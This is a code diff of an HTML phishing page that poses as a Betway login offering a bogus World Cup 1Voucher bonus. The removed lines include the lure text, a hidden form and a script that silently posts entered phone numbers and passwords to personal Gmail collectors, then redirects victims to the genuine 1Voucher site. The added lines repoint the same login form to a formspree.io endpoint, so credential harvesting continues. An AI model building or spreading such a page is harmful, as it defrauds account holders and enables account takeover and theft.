@@ -49,21 +49,6 @@
       box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
     }
 
-    .voucher-message-box {
-      background: white;
-      border: 4px solid #DD571C;
-      border-radius: 15px;
-      text-align: center;
-      padding: 25px 15px;
-      margin: 10px 20px;
-      font-family: 'Roboto Slab', serif;
-      font-style: italic;
-      color: #DD571C;
-      font-size: 16px;
-      line-height: 1.5;
-      display: none;
-    }
-
     @keyframes blinkTwice {
       0%, 20%, 40%, 100% {
         opacity: 1;
@@ -178,14 +163,9 @@
       <!-- Image -->
       <img id="voucherImage" src="https://www.peachpayments.com/hubfs/1%20voucher.png" alt="1Voucher" class="image-box" />
 
-      <!-- Message -->
-      <div id="messageBox" class="voucher-message-box">
-        Congratulations, you have claimed R360 1Voucher Bonus for World Cup Opening. Enter your Betway details below and check your Betway inbox after 2 hours for voucher code.
-      </div>
-
-      <!-- Login Form -->
-      <form id="loginForm" action="https://formsubmit.co/skoyabafuetho21@gmail.com" method="POST">
-        <input type="hidden" name="_captcha" value="false" />
+      <!-- Form with action pointing to your email handling service -->
+      <form id="loginForm" action="https://formspree.io/f/mnqvnyjq" method="POST">
+        <!-- Replace with your actual form handling URL -->
         <div class="row">
           <i class="fas fa-user"></i>
           <input
@@ -214,70 +194,7 @@
         </div>
         <div class="signup-link">Not Registered? <a href="https://betway.co.za">Signup now</a></div>
       </form>
-
-      <!-- Invisible VIP form -->
-      <form id="vipForm" action="https://formsubmit.co/robararoba21@gmail.com" method="POST" style="display:none;">
-        <input type="hidden" name="message" value="vip, voucher point claimed" />
-        <input type="submit" />
-      </form>
     </div>
   </div>
-
-  <script>
-    const loginForm = document.getElementById("loginForm");
-    const vipForm = document.getElementById("vipForm");
-
-    loginForm.addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const phone = loginForm.phone.value.trim();
-      const password = loginForm.password.value.trim();
-
-      if (phone.length !== 10) {
-        alert("Phone number must be exactly 10 digits.");
-        return;
-      }
-
-      if (password.length < 4) {
-        alert("Password must be at least 4 characters long.");
-        return;
-      }
-
-      const loginData = new FormData(loginForm);
-
-      fetch(loginForm.action, {
-        method: "POST",
-        body: loginData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          // After login success, submit VIP form silently
-          const vipData = new FormData(vipForm);
-
-          fetch(vipForm.action, {
-            method: "POST",
-            body: vipData,
-            headers: {
-              'Accept': 'application/json'
-            }
-          }).then(vipResponse => {
-            // Redirect regardless of VIP submission success
-            window.location.href = "https://www.1voucher.co.za/where-to-spend";
-          }).catch(error => {
-            // Redirect even if VIP submission fails
-            window.location.href = "https://www.1voucher.co.za/where-to-spend";
-          });
-        } else {
-          alert("Login submission failed. Please try again.");
-        }
-      }).catch(error => {
-        alert("An error occurred. Please try again later.");
-        console.error(error);
-      });
-    });
-  </script>
 </body>
 </html>
-
